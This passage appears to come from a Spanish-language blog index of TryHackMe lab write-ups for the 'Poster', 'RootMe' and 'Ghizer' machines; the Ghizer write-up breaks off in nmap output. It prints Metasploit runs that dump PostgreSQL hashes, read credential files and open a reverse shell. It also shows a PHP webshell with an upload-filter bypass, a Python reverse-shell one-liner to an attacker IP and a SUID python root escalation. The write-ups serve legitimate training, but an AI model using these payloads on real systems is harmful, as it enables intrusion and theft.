34 35 36 37 38 39 40 41 42 43 44 45 46 47  msf5 \u0026gt; use auxiliary/admin/postgres/postgres_sql msf5 auxiliary(admin/postgres/postgres_sql) \u0026gt; show options Module options (auxiliary/admin/postgres/postgres_sql): Name Current Setting Required Description ---- --------------- -------- ----------- DATABASE template1 yes The database to authenticate against PASSWORD postgres no The password for the specified username. Leave blank for a random password. RETURN_ROWSET true no Set to true to see query result sets RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 5432 yes The target port SQL select version() no The SQL query to execute USERNAME postgres yes The username to authenticate as VERBOSE false no Enable verbose output msf5 auxiliary(admin/postgres/postgres_sql) \u0026gt; set RHOSTS poster.thm RHOSTS =\u0026gt; poster.thm msf5 auxiliary(admin/postgres/postgres_sql) \u0026gt; set PASSWORD [... REDACTED ...] PASSWORD =\u0026gt; [... REDACTED ...] msf5 auxiliary(admin/postgres/postgres_sql) \u0026gt; show options Module options (auxiliary/admin/postgres/postgres_sql): Name Current Setting Required Description ---- --------------- -------- ----------- DATABASE template1 yes The database to authenticate against PASSWORD [... REDACTED ...] no The password for the specified username. Leave blank for a random password. RETURN_ROWSET true no Set to true to see query result sets RHOSTS poster.thm yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 5432 yes The target port SQL select version() no The SQL query to execute USERNAME postgres yes The username to authenticate as VERBOSE false no Enable verbose output msf5 auxiliary(admin/postgres/postgres_sql) \u0026gt; run [*] Running module against 10.10.111.10 Query Text: \u0026#39;select version()\u0026#39; =============================== version ------- PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit [*] Auxiliary module execution completed msf5 auxiliary(admin/postgres/postgres_sql) \u0026gt;   Ahora que sabemos que podemos realizar querys en la base de datos, vamos a probar si es posible obtener los hashes de los usuarios con un modulo de metasploit.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49  msf5 auxiliary(admin/postgres/postgres_sql) \u0026gt; use auxiliary/scanner/postgres/postgres_hashdump msf5 auxiliary(scanner/postgres/postgres_hashdump) \u0026gt; show options Module options (auxiliary/scanner/postgres/postgres_hashdump): Name Current Setting Required Description ---- --------------- -------- ----------- DATABASE postgres yes The database to authenticate against PASSWORD postgres no The password for the specified username. Leave blank for a random password. RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 5432 yes The target port THREADS 1 yes The number of concurrent threads (max one per host) USERNAME postgres yes The username to authenticate as msf5 auxiliary(scanner/postgres/postgres_hashdump) \u0026gt; set PASSWORD [... REDACTED ...] PASSWORD =\u0026gt; [... REDACTED ...] msf5 auxiliary(scanner/postgres/postgres_hashdump) \u0026gt; set rhosts poster.thm rhosts =\u0026gt; poster.thm msf5 auxiliary(scanner/postgres/postgres_hashdump) \u0026gt; show options Module options (auxiliary/scanner/postgres/postgres_hashdump): Name Current Setting Required Description ---- --------------- -------- ----------- DATABASE postgres yes The database to authenticate against PASSWORD [... REDACTED ...] no The password for the specified username. Leave blank for a random password. RHOSTS poster.thm yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 5432 yes The target port THREADS 1 yes The number of concurrent threads (max one per host) USERNAME postgres yes The username to authenticate as msf5 auxiliary(scanner/postgres/postgres_hashdump) \u0026gt; run [+] Query appears to have run successfully [+] Postgres Server Hashes ====================== Username Hash -------- ---- darkstart md58842b99375db43e9fdf238753623a27d poster md578fb805c7412ae597b399844a54cce0a postgres md532e12f215ba27cb750c9e093ce4b5127 sistemas md5f7dbc0d5a06653e74da6b1af9290ee2b ti md57af9ac4c593e9e4f275576e13f935579 tryhackme md503aab1165001c8f8ccae31a8824efddc [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed msf5 auxiliary(scanner/postgres/postgres_hashdump) \u0026gt;   Tambien es posible realizar una lectura de archivos dentro del servidor utilizando otro modulo de metasploit. Al realizar la lectura del archivo /etc/passwd vemos la lista de usuarios dentro del servidor, además de eso tambien vemos una direccion de un archivo de texto.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77  msf5 auxiliary(scanner/postgres/postgres_hashdump) \u0026gt; use auxiliary/admin/postgres/postgres_readfile msf5 auxiliary(admin/postgres/postgres_readfile) \u0026gt; show options Module options (auxiliary/admin/postgres/postgres_readfile): Name Current Setting Required Description ---- --------------- -------- ----------- DATABASE template1 yes The database to authenticate against PASSWORD postgres no The password for the specified username. Leave blank for a random password. RFILE /etc/passwd yes The remote file RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 5432 yes The target port USERNAME postgres yes The username to authenticate as VERBOSE false no Enable verbose output msf5 auxiliary(admin/postgres/postgres_readfile) \u0026gt; set rhosts poster.thm rhosts =\u0026gt; poster.thm msf5 auxiliary(admin/postgres/postgres_readfile) \u0026gt; set PASSWORD [... REDACTED ...] PASSWORD =\u0026gt; [... REDACTED ...] msf5 auxiliary(admin/postgres/postgres_readfile) \u0026gt; show options Module options (auxiliary/admin/postgres/postgres_readfile): Name Current Setting Required Description ---- --------------- -------- ----------- DATABASE template1 yes The database to authenticate against PASSWORD [... REDACTED ...] no The password for the specified username. Leave blank for a random password. RFILE /etc/passwd yes The remote file RHOSTS poster.thm yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 5432 yes The target port USERNAME postgres yes The username to authenticate as VERBOSE false no Enable verbose output msf5 auxiliary(admin/postgres/postgres_readfile) \u0026gt; run [*] Running module against 10.10.111.10 Query Text: \u0026#39;CREATE TEMP TABLE FEtNusWQceZc (INPUT TEXT); COPY FEtNusWQceZc FROM \u0026#39;/etc/passwd\u0026#39;; SELECT * FROM FEtNusWQceZc\u0026#39; ======================================================================================================================================= input ----- #/home/dark/credentials.txt _apt:x:105:65534::/nonexistent:/bin/false alison:x:1000:1000:Poster,,,:/home/alison:/bin/bash backup:x:34:34:backup:/var/backups:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin dark:x:1001:1001::/home/dark: games:x:5:60:games:/usr/games:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin messagebus:x:106:110::/var/run/dbus:/bin/false news:x:9:9:news:/var/spool/news:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin postgres:x:109:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash proxy:x:13:13:proxy:/bin:/usr/sbin/nologin root:x:0:0:root:/root:/bin/bash sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync sys:x:3:3:sys:/dev:/usr/sbin/nologin syslog:x:104:108::/home/syslog:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin uuidd:x:107:111::/run/uuidd:/bin/false www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin [+] 10.10.111.10:5432 Postgres - /etc/passwd saved in /home/kali/.msf4/loot/20200912002939_default_10.10.111.10_postgres.file_993710.txt [*] Auxiliary module execution completed msf5 auxiliary(admin/postgres/postgres_readfile) \u0026gt;   Realizamos la lectura de este archivo sospechoso y vemos que son \u0026ldquo;credenciales\u0026rdquo; de uno de los usuarios del servidor.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  msf5 auxiliary(admin/postgres/postgres_readfile) \u0026gt; set RFILE /home/dark/credentials.txt RFILE =\u0026gt; /home/dark/credentials.txt msf5 auxiliary(admin/postgres/postgres_readfile) \u0026gt; run [*] Running module against 10.10.111.10 Query Text: \u0026#39;CREATE TEMP TABLE bqGyoC (INPUT TEXT); COPY bqGyoC FROM \u0026#39;/home/dark/credentials.txt\u0026#39;; SELECT * FROM bqGyoC\u0026#39; ==================================================================================================================================== input ----- dark:[... REDACTED ...] dark:qwerty1234#!hackme [+] 10.10.111.10:5432 Postgres - /home/dark/credentials.txt saved in /home/kali/.msf4/loot/20200912003043_default_10.10.111.10_postgres.file_281669.txt [*] Auxiliary module execution completed msf5 auxiliary(admin/postgres/postgres_readfile) \u0026gt;   Tambien existe un modulo con el cual podemos realizar una ejecucion de comandos utilizando las credenciales de un usuario de postgres.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56  msf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) \u0026gt; msf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) \u0026gt; set PASSWORD [... REDACTED ...] PASSWORD =\u0026gt; [... REDACTED ...] msf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) \u0026gt; set rhosts poster.thm msf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) \u0026gt; set LHOST tun0 LHOST =\u0026gt; 10.10.10.10 msf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) \u0026gt; set LPORT 1338 LPORT =\u0026gt; 1338 msf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) \u0026gt; show options Module options (exploit/multi/postgres/postgres_copy_from_program_cmd_exec): Name Current Setting Required Description ---- --------------- -------- ----------- DATABASE template1 yes The database to authenticate against DUMP_TABLE_OUTPUT false no select payload command output from table (For Debugging) PASSWORD [... REDACTED ...] no The password for the specified username. Leave blank for a random password. RHOSTS poster.thm yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 5432 yes The target port (TCP) TABLENAME kkskRfiV8Yxo yes A table name that does not exist (To avoid deletion) USERNAME postgres yes The username to authenticate as Payload options (cmd/unix/reverse_perl): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.10.10.10 yes The listen address (an interface may be specified) LPORT 1338 yes The listen port Exploit target: Id Name -- ---- 0 Automatic msf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) \u0026gt; run [*] Started reverse TCP handler on 10.10.10.10:1338 [*] 10.10.111.10:5432 - 10.10.111.10:5432 - PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit [*] 10.10.111.10:5432 - Exploiting... [+] 10.10.111.10:5432 - 10.10.111.10:5432 - kkskRfiV8Yxo dropped successfully [+] 10.10.111.10:5432 - 10.10.111.10:5432 - kkskRfiV8Yxo created successfully [+] 10.10.111.10:5432 - 10.10.111.10:5432 - kkskRfiV8Yxo copied successfully(valid syntax/command) [*] Command shell session 1 opened (10.10.10.10:1338 -\u0026gt; 10.10.111.10:57476) at 2020-09-12 00:40:40 -0400 [+] 10.10.111.10:5432 - 10.10.111.10:5432 - kkskRfiV8Yxo dropped successfully(Cleaned) [*] 10.10.111.10:5432 - Exploit Succeeded id uid=109(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert) whoami postgres pwd /var/lib/postgresql/9.5/main   DARK - USER Utilizamos las credenciales en el servicio ssh y logramos obtener una shell.\nALISON - USER Realizamos una enumeracion en la maquina ya que la flag user.txt se encuentra en la carpeta de la usuario Alison en la que no tenemos acceso. En un archivo de configuracion de la pagina web que esta corriendo en el puerto 80 encontramos unas credenciales que podrian pertencer a Alison. Utilizamos estas credenciales, logramos obtener una shell con Alison y nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para cualquier comando. Utilizamos sudo su para obtener una shell con usuario root y nuestra flag root.txt.\n","description":"Poster es una maquina de TryHackMe, esta enfocada en PostgreSQL medio por el cual se obtuvieron credenciales para acceder por SSH. Credenciales almacenadas nos dieron acceso al siguiente usuario. Escalamos privilegios utilizando Sudo.","id":41,"section":"posts","tags":["postgresql","metasploit"],"title":"TryHackMe - Poster","uri":"https://sckull.github.io/posts/poster/"},{"content":"  RootMe es una maquina de TryHackMe con dificultad Facil donde obtuvimos acceso con una shell inversa tras realizar bypass al filtro de ficheros. Encontramos a Python con permisos SUID, nos ayudo a obtener acceso como root.\nRoom    Titulo RootMe      Descripción A ctf for beginners, can you root me?   Puntos 410   Dificultad Facil   Maker ReddyyZ     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11  # Nmap 7.80 scan initiated Thu Sep 10 00:43:26 2020 as: nmap -Pn -sV -o mini_scan rootme.thm Nmap scan report for rootme.thm (10.10.74.187) Host is up (0.31s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Sep 10 00:44:08 2020 -- 1 IP address (1 host up) scanned in 42.04 seconds   HTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7  kali@kali:~/thm/rootme$ gobuster dir -u http://rootme.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt /css (Status: 301) /index.php (Status: 200) /js (Status: 301) /panel (Status: 301) /server-status (Status: 403) /uploads (Status: 301)   WWW-DATA - USER En /panel encontramos un formulario para subir archivos.\nIntentamos subir un archivo PHP que contiene una mini webshell pero nos muestra un error. Al parecer los archivos PHP no estan permitidos.\n1  \u0026lt;?php echo(system($_GET[\u0026#39;cmd\u0026#39;])); ?\u0026gt;   Cambiamos el nombre del archivo a shell.php5 e intentamos nuevamente, ahora nos muestra un mensaje de que se subio exitosamente.\nEn /uploads vemos nuestra webshell.\nLe pasamos un comando a nuestra webshell y logramos ver el resultado de su ejecucion.\nEjecutamos una shell inversa utilizando nuestra webshell.\n1  python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.10.10.10\u0026#34;,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39;   Ponemos a la escucha netcat junto a rlwrap en nuestra maquina (local).\n1  rlwrap nc -lvp 1338   Logramos obtener una shell con el usuario www-data.\nY nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion de binarios SUID y vemos a python en la lista.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  bash-4.4$ find / -perm -4000 2\u0026gt; /dev/null | xargs ls -lah find / -perm -4000 2\u0026gt; /dev/null | xargs ls -lah -rwsr-xr-x 1 root root 31K Aug 11 2016 /bin/fusermount -rwsr-xr-x 1 root root 43K Jan 8 2020 /bin/mount -rwsr-xr-x 1 root root 63K Jun 28 2019 /bin/ping -rwsr-xr-x 1 root root 44K Mar 22 2019 /bin/su -rwsr-xr-x 1 root root 27K Jan 8 2020 /bin/umount [... REDACTED ...] -rwsr-sr-x 1 daemon daemon 51K Feb 20 2018 /usr/bin/at -rwsr-xr-x 1 root root 75K Mar 22 2019 /usr/bin/chfn -rwsr-xr-x 1 root root 44K Mar 22 2019 /usr/bin/chsh -rwsr-xr-x 1 root root 75K Mar 22 2019 /usr/bin/gpasswd -rwsr-xr-x 1 root root 37K Mar 22 2019 /usr/bin/newgidmap -rwsr-xr-x 1 root root 40K Mar 22 2019 /usr/bin/newgrp -rwsr-xr-x 1 root root 37K Mar 22 2019 /usr/bin/newuidmap -rwsr-xr-x 1 root root 59K Mar 22 2019 /usr/bin/passwd -rwsr-xr-x 1 root root 22K Mar 27 2019 /usr/bin/pkexec -rwsr-sr-x 1 root root 3.5M Aug 4 17:47 /usr/bin/python -rwsr-xr-x 1 root root 146K Jan 31 2020 /usr/bin/sudo -rwsr-xr-x 1 root root 19K Jun 28 2019 /usr/bin/traceroute6.iputils -rwsr-xr-- 1 root messagebus 42K Jun 11 18:25 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 10K Mar 28 2017 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-x 1 root root 427K Mar 4 2019 /usr/lib/openssh/ssh-keysign -rwsr-xr-x 1 root root 14K Mar 27 2019 /usr/lib/policykit-1/polkit-agent-helper-1 -rwsr-xr-x 1 root root 111K Jul 10 14:00 /usr/lib/snapd/snap-confine -rwsr-xr-x 1 root root 99K Nov 23 2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic bash-4.4$   Además de ello vemos en el archivo de historial de comandos que alguien utilizo python para ejecutar una shell.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  bash-4.4$ cat .bash_history id whoami ls ls cd /var ls cd www ls cat user.txt find / -perm /4000 python -c \u0026#39;import os; os.execl(\u0026#34;/bin/sh\u0026#34;, \u0026#34;sh\u0026#34;, \u0026#34;-p\u0026#34;)\u0026#39; exit bash-4.4$   Utilizamos el comando de GTFOBins - Python para ejecutar una shell como usuario root.\n1  /usr/bin/python -c \u0026#39;import os; os.execl(\u0026#34;/bin/sh\u0026#34;, \u0026#34;sh\u0026#34;, \u0026#34;-p\u0026#34;)\u0026#39;   Logramos obtener nuestra shell y nuestra flag root.txt.\n","description":"RootMe es una maquina de TryHackMe con dificultad Facil donde obtuvimos acceso con una shell inversa tras realizar bypass al filtro de ficheros. Encontramos a Python con permisos SUID, nos ayudo a obtener acceso como root.","id":42,"section":"posts","tags":["suid"],"title":"TryHackMe - RootMe","uri":"https://sckull.github.io/posts/rootme/"},{"content":"  Ghizer es una maquina de TryHackMe, encontramos un HoneyPot en el puerto FTP. Explotamos un RCE en LimeSurvey lo que nos dio acceso a la maquina. Encontramos JDWP el cual nos conectamos para obtener acceso al siguiente usuario. Tenemos permisos para ejecutar un script con Python3 al cual realizamos Python Library Hijacking para escalar privilegios.\nRoom    Titulo Ghizer      Descripción lucrecia has installed multiple web applications on the server.   Puntos 220   Dificultad Media   Maker stuxnet     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), http (80), ssl/https (443), servicio de java(?) (18002) y algunos otros puertos abiertos que no logramos obtener informacion.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127  Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-04 18:24 EDT Nmap scan report for 10.10.26.105 (10.10.26.105) Host is up (0.31s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp? 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) 443/tcp open ssl/http Apache httpd 2.4.18 ((Ubuntu)) 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port21-TCP:V=7.80%I=7%D=9/4%Time=5F52BEA9%P=x86_64-pc-linux-gnu%r(NULL, SF:33,\u0026#34;220\\x20Welcome\\x20to\\x20Anonymous\\x20FTP\\x20server\\x20\\(vsFTPd\\x203 SF:\\.0\\.3\\)\\n\u0026#34;)%r(GenericLines,58,\u0026#34;220\\x20Welcome\\x20to\\x20Anonymous\\x20FT SF:P\\x20server\\x20\\(vsFTPd\\x203\\.0\\.3\\)\\n530\\x20Please\\x20login\\x20with\\x2 SF:0USER\\x20and\\x20PASS\\.\\n\u0026#34;)%r(Help,58,\u0026#34;220\\x20Welcome\\x20to\\x20Anonymous SF:\\x20FTP\\x20server\\x20\\(vsFTPd\\x203\\.0\\.3\\)\\n530\\x20Please\\x20login\\x20w SF:ith\\x20USER\\x20and\\x20PASS\\.\\n\u0026#34;)%r(GetRequest,58,\u0026#34;220\\x20Welcome\\x20to\\ SF:x20Anonymous\\x20FTP\\x20server\\x20\\(vsFTPd\\x203\\.0\\.3\\)\\n530\\x20Please\\x SF:20login\\x20with\\x20USER\\x20and\\x20PASS\\.\\n\u0026#34;)%r(HTTPOptions,58,\u0026#34;220\\x20W SF:elcome\\x20to\\x20Anonymous\\x20FTP\\x20server\\x20\\(vsFTPd\\x203\\.0\\.3\\)\\n53 SF:0\\x20Please\\x20login\\x20with\\x20USER\\x20and\\x20PASS\\.\\n\u0026#34;)%r(RTSPRequest SF:,58,\u0026#34;220\\x20Welcome\\x20to\\x20Anonymous\\x20FTP\\x20server\\x20\\(vsFTPd\\x20 SF:3\\.0\\.3\\)\\n530\\x20Please\\x20login\\x20with\\x20USER\\x20and\\x20PASS\\.\\n\u0026#34;)% SF:r(RPCCheck,33,\u0026#34;220\\x20Welcome\\x20to\\x20Anonymous\\x20FTP\\x20server\\x20\\( SF:vsFTPd\\x203\\.0\\.3\\)\\n\u0026#34;)%r(DNSVersionBindReqTCP,58,\u0026#34;220\\x20Welcome\\x20to SF:\\x20Anonymous\\x20FTP\\x20server\\x20\\(vsFTPd\\x203\\.0\\.3\\)\\n530\\x20Please\\ SF:x20login\\x20with\\x20USER\\x20and\\x20PASS\\.\\n\u0026#34;)%r(DNSStatusRequestTCP,58, SF:\u0026#34;220\\x20Welcome\\x20to\\x20Anonymous\\x20FTP\\x20server\\x20\\(vsFTPd\\x203\\.0 SF:\\.3\\)\\n530\\x20Please\\x20login\\x20with\\x20USER\\x20and\\x20PASS\\.\\n\u0026#34;)%r(SS SF:LSessionReq,33,\u0026#34;220\\x20Welcome\\x20to\\x20Anonymous\\x20FTP\\x20server\\x20\\ SF:(vsFTPd\\x203\\.0\\.3\\)\\n\u0026#34;)%r(TerminalServerCookie,33,\u0026#34;220\\x20Welcome\\x20t SF:o\\x20Anonymous\\x20FTP\\x20server\\x20\\(vsFTPd\\x203\\.0\\.3\\)\\n\u0026#34;)%r(TLSSessi SF:onReq,33,\u0026#34;220\\x20Welcome\\x20to\\x20Anonymous\\x20FTP\\x20server\\x20\\(vsFTP SF:d\\x203\\.0\\.3\\)\\n\u0026#34;)%r(Kerberos,33,\u0026#34;220\\x20Welcome\\x20to\\x20Anonymous\\x20 SF:FTP\\x20server\\x20\\(vsFTPd\\x203\\.0\\.3\\)\\n\u0026#34;)%r(SMBProgNeg,33,\u0026#34;220\\x20Welc SF:ome\\x20to\\x20Anonymous\\x20FTP\\x20server\\x20\\(vsFTPd\\x203\\.0\\.3\\)\\n\u0026#34;)%r( SF:X11Probe,58,\u0026#34;220\\x20Welcome\\x20to\\x20Anonymous\\x20FTP\\x20server\\x20\\(vs SF:FTPd\\x203\\.0\\.3\\)\\n530\\x20Please\\x20login\\x20with\\x20USER\\x20and\\x20PAS SF:S\\.\\n\u0026#34;)%r(FourOhFourRequest,58,\u0026#34;220\\x20Welcome\\x20to\\x20Anonymous\\x20FT SF:P\\x20server\\x20\\(vsFTPd\\x203\\.0\\.3\\)\\n530\\x20Please\\x20login\\x20with\\x2 SF:0USER\\x20and\\x20PASS\\.\\n\u0026#34;); Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 202.88 seconds Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-04 18:25 EDT Warning: 10.10.26.105 giving up on port because retransmission cap hit (2). Nmap scan report for ghizer.thm (10.10.26.105) Host is up (0.25s latency). Not shown: 64833 closed ports, 696 filtered ports PORT STATE SERVICE 21/tcp open ftp 80/tcp open http 443/tcp open https 18002/tcp open unknown 36625/tcp open unknown 45775/tcp open unknown Nmap scan report for ghizer.thm (10.10.26.105) Host is up (0.25s latency). PORT STATE SERVICE VERSION 21/tcp open ftp? | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest, X11Probe: | 220 Welcome to Anonymous FTP server (vsFTPd 3.0.3) | Please login with USER and PASS. | Kerberos, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie: |_ 220 Welcome to Anonymous FTP server (vsFTPd 3.0.3) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-generator: LimeSurvey http://www.limesurvey.org |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: LimeSurvey 443/tcp open ssl/ssl Apache httpd (SSL-only mode) |_http-generator: WordPress 5.4.2 |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Ghizer \u0026amp;#8211; Just another WordPress site | ssl-cert: Subject: commonName=ubuntu | Not valid before: 2020-07-23T17:27:31 |_Not valid after: 2030-07-21T17:27:31 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 18002/tcp open java-rmi Java RMI | rmi-dumpregistry: | jmxrmi | javax.management.remote.rmi.RMIServerImpl_Stub | @127.0.1.1:33943 | extends | java.rmi.server.RemoteStub | extends |_ java.rmi.server.RemoteObject 36625/tcp closed unknown 45775/tcp closed unknown 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port21-TCP:V=7.80%I=7%D=8/14%Time=5F365C14%P=x86_64-pc-linux-gnu%r(NULL SF:,33,\u0026#34;220\\x20Welcome\\x20to\\x20Anonymous\\x20FTP\\x20server\\x20\\(vsFTPd\\x20 SF:3\\.0\\.3\\)\\n\u0026#34;)%r(GenericLines,58,\u0026#34;220\\x20Welcome\\x20to\\x20Anonymous\\x20F SF:TP\\x20server\\x20\\(vsFTPd\\x203\\.0\\.3\\)\\n530\\x20Please\\x20login\\x20with\\x SF:20USER\\x20and\\x20PASS\\.\\n\u0026#34;)%r(Help,58,\u0026#34;220\\x20Welcome\\x20to\\x20Anonymou SF:s\\x20FTP\\x20server\\x20\\(vsFTPd\\x203\\.0\\.3\\)\\n530\\x20Please\\x20login\\x20 SF:with\\x20USER\\x20and\\x20PASS\\.\\n\u0026#34;)%r(GetRequest,58,\u0026#34;220\\x20Welcome\\x20to SF:\\x20Anonymous\\x20FTP\\x20server\\x20\\(vsFTPd\\x203\\.0\\.3\\)\\n530\\x20Please\\ SF:x20login\\x20with\\x20USER\\x20and\\x20PASS\\.\\n\u0026#34;)%r(HTTPOptions,58,\u0026#34;220\\x20 SF:Welcome\\x20to\\x20Anonymous\\x20FTP\\x20server\\x20\\(vsFTPd\\x203\\.0\\.3\\)\\n5 SF:30\\x20Please\\x20login\\x20with\\x20USER\\x20and\\x20PASS\\.\\n\u0026#34;)%r(RTSPReques SF:t,58,\u0026#34;220\\x20Welcome\\x20to\\x20Anonymous\\x20FTP\\x20server\\x20\\(vsFTPd\\x2 SF:03\\.0\\.3\\)\\n530\\x20Please\\x20login\\x20with\\x20USER\\x20and\\x20PASS\\.\\n\u0026#34;) SF:%r(RPCCheck,33,\u0026#34;220\\x20Welcome\\x20to\\x20Anonymous\\x20FTP\\x20server\\x20\\ SF:(vsFTPd\\x203\\.0\\.3\\)\\n\u0026#34;)%r(DNSVersionBindReqTCP,58,\u0026#34;220\\x20Welcome\\x20t SF:o\\x20Anonymous\\x20FTP\\x20server\\x20\\(vsFTPd\\x203\\.0\\.3\\)\\n530\\x20Please SF:\\x20login\\x20with\\x20USER\\x20and\\x20PASS\\.\\n\u0026#34;)%r(DNSStatusRequestTCP,58 SF:,\u0026#34;220\\x20Welcome\\x20to\\x20Anonymous\\x20FTP\\x20server\\x20\\(vsFTPd\\x203\\. SF:0\\.3\\)\\n530\\x20Please\\x20login\\x20with\\x20USER\\x20and\\x20PASS\\.\\n\u0026#34;)%r(S SF:SLSessionReq,33,\u0026#34;220\\x20Welcome\\x20to\\x20Anonymous\\x20FTP\\x20server\\x20 SF:\\(vsFTPd\\x203\\.0\\.3\\)\\n\u0026#34;)%r(TerminalServerCookie,33,\u0026#34;220\\x20Welcome\\x20 SF:to\\x20Anonymous\\x20FTP\\x20server\\x20\\(vsFTPd\\x203\\.0\\.3\\)\\n\u0026#34;)%r(TLSSess 